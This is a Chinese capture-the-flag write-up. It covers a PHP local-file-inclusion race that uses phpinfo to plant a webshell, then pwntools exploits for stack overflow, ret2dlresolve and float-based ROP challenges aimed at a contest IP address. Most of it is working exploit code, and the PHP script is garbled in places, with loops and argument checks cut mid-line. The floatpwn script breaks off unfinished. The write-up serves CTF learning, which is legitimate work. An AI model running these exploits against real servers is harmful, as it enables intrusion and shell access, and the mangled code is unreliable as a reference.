因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。
但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：
1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；
2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大
3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接
4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包
5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除
6）我们可以利用这个时间差，成功包含临时文件，最后getshell  
利用脚本
    #!/usr/bin/python 
    import sys
    import threading
    import socket
    def setup(host, port):
        TAG="Security Test"
        PAYLOAD="""%s\r
    ')?>\r""" % TAG
        REQ1_DATA="""-----------------------------7dbff1ded0714\r
    Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
    Content-Type: text/plain\r
    \r
    %s
    -----------------------------7dbff1ded0714--\r""" % PAYLOAD
        padding="A" * 5000
        REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
    Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
    HTTP_ACCEPT: """ + padding + """\r
    HTTP_USER_AGENT: """+padding+"""\r
    HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
    HTTP_PRAGMA: """+padding+"""\r
    Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
    Content-Length: %s\r
    Host: %s\r
    \r
    %s""" %(len(REQ1_DATA),host,REQ1_DATA)
        #modify this to suit the LFI script   
        LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
    User-Agent: Mozilla/4.0\r
    Proxy-Connection: Keep-Alive\r
    Host: %s\r
    \r
    \r
    """
        return (REQ1, TAG, LFIREQ)
    def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
        s.connect((host, port))
        s2.connect((host, port))
        s.send(phpinforeq)
        d = ""
        while len(d) = self.maxattempts:
                        return
                    counter+=1
                try:
                    x = phpInfoLFI(*self.args)
                    if self.event.is_set():
                        break                
                    if x:
                        print "\nGot it! Shell created in /tmp/g"
                        self.event.set()
                except socket.error:
                    return
    def getOffset(host, port, phpinforeq):
        """Gets offset of tmp_name in the php output"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
        s.send(phpinforeq)
        d = ""
        while True:
            i = s.recv(4096)
            d+=i        
            if i == "":
                break
            # detect the final chunk
            if i.endswith("0\r\n\r\n"):
                break
        s.close()
        i = d.find("[tmp_name] =&gt; ")
        if i == -1:
            raise ValueError("No php tmp_name in phpinfo output")
        print "found %s at %i" % (d[i:i+10],i)
        # padded up a bit
        return i+256
    def main():
        print "LFI With PHPInfo()"
        print "-=" * 30
        if len(sys.argv) = maxattempts:
                        break
            print
            if e.is_set():
                print "Woot!  \m/"
            else:
                print ":("
        except KeyboardInterrupt:
            print "\nTelling threads to shutdown..."
            e.set()
        print "Shuttin' down..."
        for t in tp:
            t.join()
    if __name__=="__main__":
        main()
运行脚本  
（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）  
先验证是否上传成功  
嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell  
于是  
flag应该在那个奇怪名字的文件里吧  
果然，  
拿到flag  
这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）
## PWN
### hardpwn
导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖
    from pwn import *
    context.log_level = "debug"
    context.arch = "amd64"
    elf = ELF("pwn1")
    sh = 0
    lib = 0
    def pwn(ip,port,debug):
        global sh
        global lib
        if(debug == 1):
            sh = process("./pwn1")
        else:   
            sh = remote(ip,port)
        payload = '\x00' * 120 +"aaaa" + "\x00"
        sh.send(payload)
        sh.interactive()
    if __name__ == "__main__":
        pwn("47.110.227.208",10001,0)
### stackpwn
导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2dlresolve，用ctf-wiki的脚本改一下就可以拿到shell了  
利用roputils简化攻击
    from roputils import *
    from pwn import process
    from pwn import gdb
    from pwn import context
    from pwn import remote   #r = process('./pwn3')
    r = remote("47.110.227.208",10003)
    context.log_level = 'debug'
    rop = ROP('./pwn3')
    offset = 60
    bss_base = 0x804a000 + 0x800
    buf = rop.fill(offset)
    buf += rop.call('read', 0, bss_base, 100)
    buf += rop.dl_resolve_call(bss_base + 20, bss_base)
    r.send(buf)
    buf = rop.string('/bin/sh')
    buf += rop.fill(20, buf)
    buf += rop.dl_resolve_data(bss_base + 20, 'system')
    buf += rop.fill(100, buf)
    r.send(buf)
    r.interactive()
### floatpwn
这题考察了确定浮点寄存器通过movss写入内存时的数值  
方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之前可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。
    from pwn import *
    context.log_level = "debug"
    context.arch = "amd64"
    elf = ELF("pwn2")
    sh = 0
    lib = 0
    def inputFloat(num):
        sh.recv()
        sh.send(num)
        sh.recv()
        sh.sendline()
    def inputRop(num):
        num = str(num)
        num = num.rjust(45,"0")
        num = num.ljust(0x62,"0")
        inputFloat("0." + num)
        inputFloat("0") 
    def pwn(ip,port,debug):
        global sh
        global lib
        if(debug == 1):
            sh = process("./pwn2")
            lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        else:
            sh = remote(ip,port)
            lib = ELF("libc6_2.27-3ubuntu1_amd64.so")
        #puts 5879714 0x400640
        #pop_rdi 5881041 0x4009f3
        #__libc_start_main_got 8822026 0x601038
        #main 5880847 0x400969